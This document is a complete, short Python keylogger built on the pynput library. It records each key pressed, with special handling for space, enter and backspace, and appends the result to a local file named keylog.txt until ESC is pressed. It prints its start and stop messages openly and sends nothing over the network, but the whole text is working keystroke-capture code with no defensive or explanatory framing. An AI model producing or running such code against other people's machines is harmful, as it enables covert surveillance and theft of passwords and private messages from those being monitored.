from pynput import keyboard

log_file = "keylog.txt"

def write_to_file(key):
    key = str(key)

    with open(log_file, "a") as f:

        if key == "Key.space":
            f.write(" ")

        elif key == "Key.enter":
            f.write("\n")

        elif key == "Key.backspace":
            f.write("[BACKSPACE]")

        elif key.replace("'", "").isdigit():
            f.write(key.replace("'", ""))

        elif "Key" not in key:
            f.write(key.replace("'", ""))


def on_press(key):
    write_to_file(key)


def on_release(key):

    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False


print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
